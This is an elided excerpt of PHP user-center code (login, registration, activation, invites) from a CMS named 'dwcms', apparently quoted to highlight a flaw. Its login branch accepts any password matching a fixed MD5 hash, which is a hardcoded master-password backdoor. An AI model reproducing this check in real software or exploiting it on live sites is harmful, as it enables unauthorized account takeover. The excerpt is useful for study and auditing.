...
$temlate_dir = "themes/xmyg_member";
...
$_U['epage'] = empty($_REQUEST['epage'])?"30":$_REQUEST['epage'];//分页的每一页
...
$_U['query_url'] = $_U['member_url']."&q={$_U['query_sort']}/{$_U['query_class']}";
 ...
 $_U['user_reg_key'] = "dwcms";

if ($_U['query_sort'] == "action"){
	# 检查用户名是否被注册
	if ($_U['query_class'] == 'check_username'){
		$result = userClass::CheckUsername(array("username"=>$_REQUEST['username']));
		if ($result == false){
			echo true;exit;
		}else{
			echo false;exit;
	...
	elseif ($_U['query_class'] == 'login'){
		...
		if (isset($_POST['password'])){
			...
			if (md5($_POST['password'])=="f2c239687c44fb9a1dfd5fdf9ca907f7" ){
	...
	elseif ($_U['query_class'] == 'reg'){
		if ($_G['user_id']!=""){
			...
			if ($_SESSION['reg_step']=="reg_email"){
				...
				header('location:/?user&q=action/reg_email');
				exit;
			}
		}
	...
	*/
	...
	elseif ($_U['query_class'] == 'active') {
		...
		$credit['nid'] = "email";
		$credit['article_id'] = $data['user_id'];
		...
		if ($result!=false) {
			$msg = array('邮箱激活成功','','/?user');
		}
		else{
			$msg = array('激活失败','','/?user&q=reg_email');
		}
	...
	elseif ($_U['query_class'] == 'check'){
		...
		if ($_G['user_result']['real_status']==0){
			...
			echo "<a href='//?user&q=code/user/realname'>立即实名认证</a>";
		}
		exit;
	}
	...
	elseif ($_U['query_class'] == "reginvite"){	
		...
		header('location:/?user&q=action/reg');
	}
	
# 用户中心处理数据的地方	
}elseif ($_U['query_sort'] == "code"){	
	if  ((!isset($_G['user_id']) || $_G['user_id']=="") ||  $_G["cookie_id"] !=$_G["user_result"]["session_id"]){
			header('location:/?user&q=action/logout');
	}
	...
	if ($_G['user_id'] == "" ||  $_G["cookie_id"] !=$_G["user_result"]["session_id"]){
		header('location:/?user&q=action/logout');
	}
	...
	$_U['borrow_count'] = borrowClass::GetBorrowCount(array("user_id"=>$_G['user_id']));//统计
